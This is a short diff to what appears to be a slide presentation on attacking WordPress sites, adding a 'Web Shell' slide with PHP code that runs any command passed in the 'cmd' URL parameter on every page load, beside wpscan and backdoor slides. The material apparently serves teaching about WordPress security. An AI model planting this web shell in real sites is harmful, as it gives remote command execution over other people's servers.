@@ -337,6 +337,18 @@ wpscan --url www.example.com --enumerate
 				</section>
 
 				<section>
+					<h2>Web Shell</h2>
+					<pre><code data-trim>
+function webshell() {
+	echo shell_exec($_GET['cmd']);
+	die();
+}
+add_action('wp_head', 'webshell');
+					</code></pre>
+					<small><a href="https://www.youtube.com/watch?v=XHShse4z6ds">Simple Wordpress Web Shell Tutorial - Youtube</a></small>
+				</section>
+
+				<section>
 					<h2>Backdoor</h2>
 					<pre><code data-trim>
 @unlink(__FILE__);
